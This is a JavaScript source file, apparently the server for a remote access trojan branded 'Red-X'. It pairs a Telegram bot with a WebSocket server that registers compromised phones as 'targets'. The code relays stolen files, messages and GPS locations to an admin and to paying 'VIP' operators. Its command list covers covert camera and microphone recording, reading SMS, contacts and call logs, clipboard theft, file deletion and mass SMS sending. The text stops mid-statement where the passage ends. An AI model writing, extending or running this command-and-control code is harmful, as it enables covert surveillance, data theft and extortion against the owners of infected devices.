const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");
const fs = require('fs');

// Config file se data load karna
const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
const token = config.telegram.token;
const id = config.telegram.chatId;
const address = config.address;
const CHANNEL_USERNAME = '@REDX_64';
const CHANNEL_URL = 'https://t.me/REDX_64';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// VIP Access System with Tracking
let vipUsers = new Set();
let adminUsers = new Set();
const VIP_STORAGE_FILE = 'vip_users.json';
const ACTIVITY_LOG_FILE = 'activity_logs.json';

// Activity Tracking System
let userActivities = new Map(); // userId -> {lastActivity, totalCommands, devicesUsed}

// Command names mapping
const COMMAND_NAMES = {
    'camera_main': '📷 Main Camera',
    'camera_selfie': '🤳 Selfie Camera', 
    'microphone': '🎤 Microphone',
    'rec_camera_main': '📹 Record Main Cam',
    'rec_camera_selfie': '🎬 Record Selfie',
    'file': '📁 Files List',
    'delete_file': '🗑️ Delete File',
    'clipboard': '📋 Clipboard',
    'device_info': '📊 Device Info',
    'apps': '📱 Apps List',
    'location': '📍 Location',
    'calls': '📞 Call Logs',
    'contacts': '👥 Contacts',
    'messages': '💬 Messages',
    'send_message': '📨 Send SMS',
    'send_message_to_all': '📢 Blast SMS',
    'show_notification': '🔔 Show Notification',
    'toast': '⚠️ Show Toast',
    'vibrate': '📳 Vibrate',
    'play_audio': '🔊 Play Audio',
    'stop_audio': '🔇 Stop Audio'
};

// Load VIP users from file
if (fs.existsSync(VIP_STORAGE_FILE)) {
    try {
        const savedData = JSON.parse(fs.readFileSync(VIP_STORAGE_FILE, 'utf8'));
        vipUsers = new Set(savedData.vipUsers || []);
        adminUsers = new Set(savedData.adminUsers || []);
        console.log(`✅ Loaded ${vipUsers.size} VIP users from storage`);
    } catch (e) {
        console.log('❌ Error loading VIP data:', e.message);
    }
}

// Load activity logs
if (fs.existsSync(ACTIVITY_LOG_FILE)) {
    try {
        const savedLogs = JSON.parse(fs.readFileSync(ACTIVITY_LOG_FILE, 'utf8'));
        userActivities = new Map(savedLogs.userActivities || []);
    } catch (e) {
        console.log('❌ Error loading activity logs:', e.message);
    }
}

// Initialize with admin from config
if (id) {
    adminUsers.add(Number(id));
    // Initialize admin activity tracking
    if (!userActivities.has(Number(id))) {
        userActivities.set(Number(id), {
            username: 'ADMIN',
            firstName: 'System',
            lastName: 'Admin',
            totalCommands: 0,
            lastActivity: new Date().toISOString(),
            devicesUsed: new Set(),
            commandHistory: []
        });
    }
}

// Function to check if user has access
function hasAccess(userId) {
    return adminUsers.has(userId) || vipUsers.has(userId);
}

// Function to add VIP user
function addVipUser(userId, userInfo = {}) {
    const numId = Number(userId);
    vipUsers.add(numId);
    
    // Initialize activity tracking for new VIP
    if (!userActivities.has(numId)) {
        userActivities.set(numId, {
            username: userInfo.username || 'N/A',
            firstName: userInfo.first_name || 'Unknown',
            lastName: userInfo.last_name || '',
            totalCommands: 0,
            lastActivity: new Date().toISOString(),
            devicesUsed: new Set(),
            commandHistory: []
        });
    }
    
    console.log(`✅ VIP added: ${numId}`);
    saveVipUsers();
    saveActivityLogs();
    return numId;
}

// Function to remove VIP user
function removeVipUser(userId) {
    const numId = Number(userId);
    vipUsers.delete(numId);
    console.log(`❌ VIP removed: ${numId}`);
    saveVipUsers();
    return numId;
}

// Function to list all VIP users
function listVipUsers() {
    return Array.from(vipUsers);
}

// Function to save VIP users
function saveVipUsers() {
    const data = {
        vipUsers: Array.from(vipUsers),
        adminUsers: Array.from(adminUsers)
    };
    fs.writeFileSync(VIP_STORAGE_FILE, JSON.stringify(data, null, 2));
}

// Function to save activity logs
function saveActivityLogs() {
    const data = {
        userActivities: Array.from(userActivities.entries()).map(([key, value]) => {
            return [key, {
                ...value,
                devicesUsed: Array.from(value.devicesUsed || [])
            }];
        })
    };
    fs.writeFileSync(ACTIVITY_LOG_FILE, JSON.stringify(data, null, 2));
}

// Function to log user activity
function logUserActivity(userId, command, deviceUuid = null, deviceInfo = null) {
    const numId = Number(userId);
    
    if (!userActivities.has(numId)) {
        // Get user info from callback if available
        userActivities.set(numId, {
            username: 'N/A',
            firstName: 'Unknown',
            lastName: '',
            totalCommands: 0,
            lastActivity: new Date().toISOString(),
            devicesUsed: new Set(),
            commandHistory: []
        });
    }
    
    const userActivity = userActivities.get(numId);
    userActivity.totalCommands = (userActivity.totalCommands || 0) + 1;
    userActivity.lastActivity = new Date().toISOString();
    
    if (deviceUuid && deviceInfo) {
        userActivity.devicesUsed = userActivity.devicesUsed || new Set();
        userActivity.devicesUsed.add(deviceUuid);
    }
    
    // Add to command history (keep last 50 commands)
    userActivity.commandHistory = userActivity.commandHistory || [];
    userActivity.commandHistory.unshift({
        timestamp: new Date().toISOString(),
        command: command,
        deviceUuid: deviceUuid,
        deviceModel: deviceInfo?.model || 'Unknown'
    });
    
    if (userActivity.commandHistory.length > 50) {
        userActivity.commandHistory = userActivity.commandHistory.slice(0, 50);
    }
    
    // Save logs
    saveActivityLogs();
    
    return userActivity;
}

// Function to notify admin about user activity
function notifyAdminActivity(userId, command, deviceInfo = null) {
    const userActivity = userActivities.get(Number(userId)) || {};
    const commandName = COMMAND_NAMES[command] || command;
    
    let deviceText = '';
    if (deviceInfo) {
        deviceText = `\n• 📱 Device: <b>${deviceInfo.model}</b>`;
    }
    
    const activityMessage = `👤 𝙐𝙎𝙀𝙍 𝘼𝘾𝙏𝙄𝙑𝙄𝙏𝙔\n\n` +
                           `• 👤 User: <b>${userActivity.firstName} ${userActivity.lastName || ''}</b>\n` +
                           `• 🆔 ID: <code>${userId}</code>\n` +
                           `• 👤 Username: @${userActivity.username || 'N/A'}\n` +
                           `• ⚡ Command: <b>${commandName}</b>${deviceText}\n` +
                           `• 🕐 Time: ${new Date().toLocaleString()}\n` +
                           `• 📊 Total Commands: <b>${userActivity.totalCommands || 0}</b>`;
    
    // Send to admin
    appBot.sendMessage(id, activityMessage, {parse_mode: "HTML"})
        .catch(e => console.log('Failed to notify admin:', e.message));
}

// Debug logging
appBot.on('polling_error', (error) => {
    console.log('Polling error:', error);
});

appBot.on('error', (error) => {
    console.log('Bot error:', error);
});

console.log('🚀 Bot starting with token:', token ? 'Token present' : 'Token missing');
console.log('📱 Admin Chat ID:', id);
console.log(`👑 VIP Users: ${vipUsers.size}`);
console.log(`📊 Active Users: ${userActivities.size}`);

// File upload routes with tracking
app.get('/', function (req, res) {
    res.send('<h1 align="center">🕸️ 𝙎𝙔𝙎𝙏𝙀𝙈 𝙐𝙋𝙇𝙊𝘼𝘿𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const caption = `🎯 𝙁𝙄𝙇𝙀 𝙁𝙍𝙊𝙈 <b>${req.headers.model}</b> 𝘿𝙀𝙑𝙄𝘾𝙀`;
    
    // Send to admin
    appBot.sendDocument(id, req.file.buffer, {
        caption: caption,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt',
    });
    
    // Send to all VIP users
    vipUsers.forEach(vipId => {
        appBot.sendDocument(vipId, req.file.buffer, {
            caption: caption,
            parse_mode: "HTML"
        }, {
            filename: name,
            contentType: 'application/txt',
        }).catch(e => console.log(`Failed to send to VIP ${vipId}:`, e.message));
    });
    
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const message = `🎯 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙁𝙍𝙊𝙈 <b>${req.headers.model}</b> 𝘿𝙀𝙑𝙄𝘾𝙀\n\n${req.body['text']}`;
    
    // Send to admin
    appBot.sendMessage(id, message, {parse_mode: "HTML"});
    
    // Send to all VIP users
    vipUsers.forEach(vipId => {
        appBot.sendMessage(vipId, message, {parse_mode: "HTML"})
            .catch(e => console.log(`Failed to send to VIP ${vipId}:`, e.message));
    });
    
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    const lat = req.body['lat'];
    const lon = req.body['lon'];
    const message = `📍 𝙇𝙊𝘾𝘼𝙏𝙄𝙊𝙉 𝙁𝙍𝙊𝙈 <b>${req.headers.model}</b> 𝘿𝙀𝙑𝙄𝘾𝙀`;
    
    // Send to admin
    appBot.sendLocation(id, lat, lon);
    appBot.sendMessage(id, message, {parse_mode: "HTML"});
    
    // Send to all VIP users
    vipUsers.forEach(vipId => {
        appBot.sendLocation(vipId, lat, lon)
            .catch(e => console.log(`Failed to send location to VIP ${vipId}:`, e.message));
        appBot.sendMessage(vipId, message, {parse_mode: "HTML"})
            .catch(e => console.log(`Failed to send message to VIP ${vipId}:`, e.message));
    });
    
    res.send('');
});

// WebSocket connection
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model || 'Unknown'
    const battery = req.headers.battery || 'Unknown'
    const version = req.headers.version || 'Unknown'
    const brightness = req.headers.brightness || 'Unknown'
    const provider = req.headers.provider || 'Unknown'

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        uuid: uuid,
        connectedAt: new Date().toISOString()
    })
    
    console.log(`📱 New device connected: ${model} (${uuid})`)
    
    const connectionMessage = `🎯 𝙉𝙀𝙒 𝙏𝘼𝙍𝙂𝙀𝙏 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿\n\n` +
        `• 🖥️ 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b>\n` +
        `• 🔋 𝘽𝙖𝙩𝙩𝙚𝙧𝙮: <b>${battery}</b>\n` +
        `• 📱 𝙑𝙚𝙧𝙨𝙞𝙤𝙣: <b>${version}</b>\n` +
        `• 💡 𝘽𝙧𝙞𝙜𝙝𝙩𝙣𝙚𝙨𝙨: <b>${brightness}</b>\n` +
        `• 📶 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧: <b>${provider}</b>\n` +
        `• 🔑 𝘿𝙚𝙫𝙞𝙘𝙚 𝙄𝘿: <code>${uuid}</code>`;
    
    // Notify admin
    appBot.sendMessage(id, connectionMessage, {parse_mode: "HTML"});
    
    // Notify all VIP users
    vipUsers.forEach(vipId => {
        appBot.sendMessage(vipId, connectionMessage, {parse_mode: "HTML"})
            .catch(e => console.log(`Failed to notify VIP ${vipId}:`, e.message));
    });
    
    ws.on('close', function () {
        console.log(`📱 Device disconnected: ${model} (${uuid})`)
        const disconnectionMessage = `⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙄𝙎𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿\n\n` +
            `• 🖥️ 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b>\n` +
            `• 🔋 𝘽𝙖𝙩𝙩𝙚𝙧𝙮: <b>${battery}</b>\n` +
            `• 📱 𝙑𝙚𝙧𝙨𝙞𝙤𝙣: <b>${version}</b>\n` +
            `• 💡 𝘽𝙧𝙞𝙜𝙝𝙩𝙣𝙚𝙨𝙨: <b>${brightness}</b>\n` +
            `• 📶 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧: <b>${provider}</b>\n` +
            `• 🔑 𝘿𝙚𝙫𝙞𝙘𝙚 𝙄𝘿: <code>${uuid}</code>`;
        
        // Notify admin
        appBot.sendMessage(id, disconnectionMessage, {parse_mode: "HTML"});
        
        // Notify all VIP users
        vipUsers.forEach(vipId => {
            appBot.sendMessage(vipId, disconnectionMessage, {parse_mode: "HTML"})
                .catch(e => console.log(`Failed to notify VIP ${vipId}:`, e.message));
        });
        
        appClients.delete(ws.uuid)
    })
})

// Bot message handler
appBot.on('message', async (message) => {
    const chatId = message.chat.id;
    const userId = message.from.id;
    
    console.log(`📨 Message received from ${userId}: ${message.text}`);
    
    // Log user info if not exists
    if (!userActivities.has(userId)) {
        userActivities.set(userId, {
            username: message.from.username || 'N/A',
            firstName: message.from.first_name || 'Unknown',
            lastName: message.from.last_name || '',
            totalCommands: 0,
            lastActivity: new Date().toISOString(),
            devicesUsed: new Set(),
            commandHistory: []
        });
        saveActivityLogs();
    }
    
    // Check access for all commands except /start and VIP commands
    if (message.text !== '/start' && !message.text.startsWith('/vip') && 
        !message.text.startsWith('/addvip') && !message.text.startsWith('/removevip') &&
        !message.text.startsWith('/listvip') && !message.text.startsWith('/userinfo') &&
        !message.text.startsWith('/activity') && !message.text.startsWith('/logs')) {
        
        if (!hasAccess(userId)) {
            appBot.sendMessage(chatId, 
                `❌ 𝘼𝘾𝘾𝙀𝙎𝙎 𝘿𝙀𝙉𝙄𝙀𝘿\n\n` +
                `⚠️ You don't have permission to use this bot.\n` +
                `🔑 Contact admin for VIP access.\n\n` +
                `👑 Admin: @REDX_64`,
                {
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🔗 Join Channel', url: CHANNEL_URL },
                            { text: '👑 Request VIP', callback_data: 'request_vip' }
                        ]]
                    }
                }
            );
            return;
        }
    }
    
    if (message.text == '/start') {
        if (hasAccess(userId)) {
            appBot.sendMessage(chatId,
                `👑 𝙍𝙀𝘿-𝙓 𝙑𝙄𝙋 𝘼𝘾𝘾𝙀𝙎𝙎 𝙎𝙔𝙎𝙏𝙀𝙈\n\n` +
                `🕸️ 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙍𝘼𝙏 𝘾𝙊𝙉𝙏𝙍𝙊𝙇 𝙋𝘼𝙉𝙀𝙇\n\n` +
                `⚠️ 𝙋𝙍𝙊𝙁𝙀𝙎𝙎𝙄𝙊𝙉𝘼𝙇 𝙎𝙔𝙎𝙏𝙀𝙈 𝘾𝙊𝙉𝙏𝙍𝙊𝙇\n\n` +
                `🔒 𝘼𝙘𝙘𝙚𝙨𝙨: ${adminUsers.has(userId) ? '👑 𝘼𝘿𝙈𝙄𝙉' : '⭐ 𝙑𝙄𝙋'}\n` +
                `🎯 𝙈𝙪𝙡𝙩𝙞-𝘿𝙚𝙫𝙞𝙘𝙚 𝙎𝙪𝙧𝙫𝙚𝙞𝙡𝙡𝙖𝙣𝙘𝙚\n` +
                `📡 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣\n\n` +
                `✅ 𝙎𝙮𝙨𝙩𝙚𝙢 𝙍𝙚𝙖𝙙𝙮 𝙁𝙤𝙧 𝙊𝙥𝙚𝙧𝙖𝙩𝙞𝙤𝙣`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [
                            ["🎯 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎"],
                            ["⚡ 𝙀𝙓𝙀𝘾𝙐𝙏𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿"],
                            ["🚨 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎"]
                        ],
                        resize_keyboard: true
                    }
                }
            );
        } else {
            appBot.sendMessage(chatId,
                `👑 𝙍𝙀𝘿-𝙓 𝙑𝙄𝙋 𝘼𝘾𝘾𝙀𝙎𝙎 𝙎𝙔𝙎𝙏𝙀𝙈\n\n` +
                `🔒 𝙍𝙀𝙎𝙏𝙍𝙄𝘾𝙏𝙀𝘿 𝘼𝘾𝘾𝙀𝙎𝙎\n\n` +
                `⚠️ This bot requires VIP access.\n` +
                `🔑 Contact admin for authorization.\n\n` +
                `👑 Admin: @REDX_64\n` +
                `📢 Channel: ${CHANNEL_USERNAME}`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🔗 Join Channel', url: CHANNEL_URL },
                            { text: '👑 Request VIP', callback_data: 'request_vip' }
                        ]]
                    }
                }
            );
        }
    }
    
    // Admin commands for tracking
    if (message.text && message.text.startsWith('/userinfo')) {
        if (adminUsers.has(userId)) {
            const targetUserId = message.text.split(' ')[1] || userId;
            const userActivity = userActivities.get(Number(targetUserId));
            
            if (userActivity) {
                const devicesCount = userActivity.devicesUsed ? userActivity.devicesUsed.size : 0;
                let recentCommands = 'No recent commands';
                
                if (userActivity.commandHistory && userActivity.commandHistory.length > 0) {
                    recentCommands = userActivity.commandHistory.slice(0, 5).map((cmd, idx) => {
                        return `${idx + 1}. ${COMMAND_NAMES[cmd.command] || cmd.command} on ${cmd.deviceModel} at ${new Date(cmd.timestamp).toLocaleTimeString()}`;
                    }).join('\n');
                }
                
                const infoMessage = `👤 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉\n\n` +
                                   `• 👤 Name: <b>${userActivity.firstName} ${userActivity.lastName || ''}</b>\n` +
                                   `• 🆔 ID: <code>${targetUserId}</code>\n` +
                                   `• 👤 Username: @${userActivity.username || 'N/A'}\n` +
                                   `• ⭐ Status: ${adminUsers.has(Number(targetUserId)) ? '👑 ADMIN' : (vipUsers.has(Number(targetUserId)) ? '⭐ VIP' : '👤 USER')}\n` +
                                   `• 📊 Total Commands: <b>${userActivity.totalCommands || 0}</b>\n` +
                                   `• 📱 Devices Used: <b>${devicesCount}</b>\n` +
                                   `• 🕐 Last Active: ${new Date(userActivity.lastActivity).toLocaleString()}\n\n` +
                                   `📋 𝙍𝙀𝘾𝙀𝙉𝙏 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎:\n${recentCommands}`;
                
                appBot.sendMessage(chatId, infoMessage, {parse_mode: "HTML"});
            } else {
                appBot.sendMessage(chatId, `❌ User ${targetUserId} not found in activity logs.`);
            }
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
    }
    
    if (message.text && message.text.startsWith('/activity')) {
        if (adminUsers.has(userId)) {
            let activityMessage = `📊 𝙎𝙔𝙎𝙏𝙀𝙈 𝘼𝘾𝙏𝙄𝙑𝙄𝙏𝙔 𝙍𝙀𝙋𝙊𝙍𝙏\n\n`;
            activityMessage += `• 👥 Total Users: <b>${userActivities.size}</b>\n`;
            activityMessage += `• ⭐ VIP Users: <b>${vipUsers.size}</b>\n`;
            activityMessage += `• 🎯 Active Targets: <b>${appClients.size}</b>\n`;
            activityMessage += `• ⚡ Total Commands Executed: <b>${Array.from(userActivities.values()).reduce((sum, user) => sum + (user.totalCommands || 0), 0)}</b>\n\n`;
            
            // Top 5 active users
            const topUsers = Array.from(userActivities.entries())
                .filter(([uid, _]) => hasAccess(uid))
                .sort((a, b) => (b[1].totalCommands || 0) - (a[1].totalCommands || 0))
                .slice(0, 5);
            
            if (topUsers.length > 0) {
                activityMessage += `🏆 𝙏𝙊𝙋 5 𝘼𝘾𝙏𝙄𝙑𝙀 𝙐𝙎𝙀𝙍𝙎:\n`;
                topUsers.forEach(([uid, user], index) => {
                    activityMessage += `${index + 1}. ${user.firstName}: ${user.totalCommands || 0} commands\n`;
                });
            }
            
            appBot.sendMessage(chatId, activityMessage, {parse_mode: "HTML"});
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
    }
    
    if (message.text && message.text.startsWith('/logs')) {
        if (adminUsers.has(userId)) {
            const days = parseInt(message.text.split(' ')[1]) || 1;
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - days);
            
            let allCommands = [];
            userActivities.forEach((user, userId) => {
                if (user.commandHistory) {
                    user.commandHistory.forEach(cmd => {
                        if (new Date(cmd.timestamp) > cutoffDate) {
                            allCommands.push({
                                userId: userId,
                                userName: user.firstName,
                                ...cmd
                            });
                        }
                    });
                }
            });
            
            allCommands.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            if (allCommands.length > 0) {
                let logsMessage = `📝 𝘼𝘾𝙏𝙄𝙑𝙄𝙏𝙔 𝙇𝙊𝙂𝙎 (Last ${days} day${days > 1 ? 's' : ''})\n\n`;
                
                allCommands.slice(0, 20).forEach((cmd, idx) => {
                    logsMessage += `${idx + 1}. ${cmd.userName} → ${COMMAND_NAMES[cmd.command] || cmd.command}\n`;
                    logsMessage += `   📱 ${cmd.deviceModel} | ${new Date(cmd.timestamp).toLocaleString()}\n\n`;
                });
                
                if (allCommands.length > 20) {
                    logsMessage += `... and ${allCommands.length - 20} more commands`;
                }
                
                appBot.sendMessage(chatId, logsMessage, {parse_mode: "HTML"});
            } else {
                appBot.sendMessage(chatId, `No activity logs found for the last ${days} day${days > 1 ? 's' : ''}.`);
            }
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
    }
    
    // Admin VIP management commands (existing)
    if (message.text && message.text.startsWith('/addvip')) {
        if (adminUsers.has(userId)) {
            const targetUserId = message.text.split(' ')[1];
            if (targetUserId) {
                addVipUser(targetUserId, message.from);
                appBot.sendMessage(chatId, `✅ VIP access granted to user: ${targetUserId}`);
                appBot.sendMessage(targetUserId, 
                    `⭐ 𝙑𝙄𝙋 𝘼𝘾𝘾𝙀𝙎𝙎 𝙂𝙍𝘼𝙉𝙏𝙀𝘿\n\n` +
                    `Congratulations! You now have VIP access to Red-X Control System.\n\n` +
                    `Type /start to begin.`
                );
            } else {
                appBot.sendMessage(chatId, 'Usage: /addvip <user_id>');
            }
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
    }
    
    if (message.text && message.text.startsWith('/removevip')) {
        if (adminUsers.has(userId)) {
            const targetUserId = message.text.split(' ')[1];
            if (targetUserId) {
                removeVipUser(targetUserId);
                appBot.sendMessage(chatId, `❌ VIP access removed from user: ${targetUserId}`);
            } else {
                appBot.sendMessage(chatId, 'Usage: /removevip <user_id>');
            }
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
    }
    
    if (message.text && message.text.startsWith('/listvip')) {
        if (adminUsers.has(userId)) {
            const vipList = listVipUsers();
            if (vipList.length > 0) {
                let messageText = '👑 𝙑𝙄𝙋 𝙐𝙎𝙀𝙍𝙎 𝙇𝙄𝙎𝙏:\n\n';
                vipList.forEach((vipId, index) => {
                    const userInfo = userActivities.get(vipId);
                    const name = userInfo ? `${userInfo.firstName} ${userInfo.lastName || ''}` : 'Unknown';
                    const commands = userInfo ? userInfo.totalCommands || 0 : 0;
                    messageText += `${index + 1}. ${name} (${vipId}) - ${commands} commands\n`;
                });
                appBot.sendMessage(chatId, messageText);
            } else {
                appBot.sendMessage(chatId, 'No VIP users found.');
            }
        } else {
            appBot.sendMessage(chatId, '❌ Admin access required!');
        }
    }
    
    // Main bot functionality (only for authorized users)
    if (hasAccess(userId)) {
        if (message.text == '🎯 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎') {
            // Log activity
            logUserActivity(userId, 'list_devices');
            
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '⚠️ 𝙉𝙊 𝘼𝘾𝙏𝙄𝙑𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝙎\n' +
                    '• 𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙛𝙤𝙧 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨...'
                )
            } else {
                let text = '🎯 𝘼𝘾𝙏𝙄𝙑𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝙎:\n\n'
                let counter = 1
                appClients.forEach(function (value, key, map) {
                    text += `🔴 𝙏𝘼𝙍𝙂𝙀𝙏 #${counter}\n` +
                            `• 🖥️ 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${value.model}</b>\n` +
                            `• 🔋 𝘽𝙖𝙩𝙩𝙚𝙧𝙮: <b>${value.battery}%</b>\n` +
                            `• 📱 𝙑𝙚𝙧𝙨𝙞𝙤𝙣: <b>${value.version}</b>\n` +
                            `• 💡 𝘽𝙧𝙞𝙜𝙝𝙩𝙣𝙚𝙨𝙨: <b>${value.brightness}%</b>\n` +
                            `• 📶 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧: <b>${value.provider}</b>\n\n`
                    counter++
                })
                text += `🔴 𝙏𝙊𝙏𝘼𝙇 𝙏𝘼𝙍𝙂𝙀𝙏𝙎: <b>${appClients.size}</b>`
                appBot.sendMessage(chatId, text, {parse_mode: "HTML"})
            }
        }
        
        if (message.text == '⚡ 𝙀𝙓𝙀𝘾𝙐𝙏𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿') {
            // Log activity
            logUserActivity(userId, 'execute_command_menu');
            
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '⚠️ 𝙉𝙊 𝘼𝘾𝙏𝙄𝙑𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝙎\n' +
                    '• 𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙛𝙤𝙧 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨...'
                )
            } else {
                const deviceListKeyboard = []
                let counter = 1
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: `🔴 ${counter}. ${value.model} (${value.battery}%)`,
                        callback_data: 'device:' + key
                    }])
                    counter++
                })
                appBot.sendMessage(chatId, '🎯 𝙎𝙀𝙇𝙀𝘾𝙏 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙑𝙄𝘾𝙀:', {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: deviceListKeyboard,
                    },
                })
            }
        }
        
        if (message.text == '🚨 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎') {
            // Log activity
            logUserActivity(userId, 'system_status');
            
            const statusText = `📊 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎\n\n` +
                              `🎯 𝘼𝙘𝙩𝙞𝙫𝙚 𝙏𝙖𝙧𝙜𝙚𝙩𝙨: <b>${appClients.size}</b>\n` +
                              `⭐ 𝙑𝙄𝙋 𝙐𝙨𝙚𝙧𝙨: <b>${vipUsers.size}</b>\n` +
                              `👥 𝘼𝙘𝙩𝙞𝙫𝙚 𝙐𝙨𝙚𝙧𝙨: <b>${Array.from(userActivities.values()).filter(u => hasAccess(u.userId)).length}</b>\n` +
                              `📡 𝙒𝙚𝙗𝙎𝙤𝙘𝙠𝙚𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙊𝙉𝙇𝙄𝙉𝙀\n` +
                              `🤖 𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉𝘼𝙇\n` +
                              `👑 𝙔𝙤𝙪𝙧 𝙍𝙤𝙡𝙚: ${adminUsers.has(userId) ? '𝘼𝘿𝙈𝙄𝙉' : '𝙑𝙄𝙋'}\n` +
                              `⚠️ 𝙎𝙔𝙎𝙏𝙀𝙈: 𝙍𝙀𝘼𝘿𝙔 𝙁𝙊𝙍 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉`
            appBot.sendMessage(chatId, statusText, {parse_mode: "HTML"})
        }
    }
})

// Callback query handler with tracking
appBot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id;
    const chatId = msg.chat.id;
    const userInfo = callbackQuery.from;
    
    console.log(`🔘 Callback received: ${data} from user: ${userId}`);
    
    // Update user info in activity tracking
    if (!userActivities.has(userId)) {
        userActivities.set(userId, {
            username: userInfo.username || 'N/A',
            firstName: userInfo.first_name || 'Unknown',
            lastName: userInfo.last_name || '',
            totalCommands: 0,
            lastActivity: new Date().toISOString(),
            devicesUsed: new Set(),
            commandHistory: []
        });
    }
    
    // Handle VIP request
    if (data === 'request_vip') {
        logUserActivity(userId, 'request_vip');
        
        appBot.sendMessage(chatId, 
            `👑 𝙑𝙄𝙋 𝘼𝘾𝘾𝙀𝙎𝙎 𝙍𝙀𝙌𝙐𝙀𝙎𝙏\n\n` +
            `Your request has been sent to admin.\n` +
            `User ID: ${userId}\n\n` +
            `👑 Admin: @REDX_64`
        );
        
        // Notify admin with user info
        const userActivity = userActivities.get(userId);
        appBot.sendMessage(id,
            `👑 𝙉𝙀𝙒 𝙑𝙄𝙋 𝙍𝙀𝙌𝙐𝙀𝙎𝙏\n\n` +
            `• 👤 Name: ${userActivity.firstName} ${userActivity.lastName || ''}\n` +
            `• 🆔 User ID: ${userId}\n` +
            `• 👤 Username: @${userActivity.username || 'N/A'}\n` +
            `• 📊 Total Requests: ${userActivity.totalCommands || 0}\n\n` +
            `To approve: /addvip ${userId}`,
            {
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approve', callback_data: `approve_vip:${userId}` },
                        { text: '❌ Reject', callback_data: `reject_vip:${userId}` }
                    ]]
                }
            }
        );
        
        appBot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    
    // Handle VIP approval/rejection
    if (data.startsWith('approve_vip') || data.startsWith('reject_vip')) {
        if (adminUsers.has(userId)) {
            const targetUserId = data.split(':')[1];
            const targetUserActivity = userActivities.get(Number(targetUserId));
            
            if (data.startsWith('approve_vip')) {
                addVipUser(targetUserId, targetUserActivity);
                appBot.sendMessage(chatId, `✅ VIP access granted to user: ${targetUserId} (@${targetUserActivity?.username || 'N/A'})`);
                appBot.sendMessage(targetUserId, 
                    `⭐ 𝙑𝙄𝙋 𝘼𝘾𝘾𝙀𝙎𝙎 𝙂𝙍𝘼𝙉𝙏𝙀𝘿\n\n` +
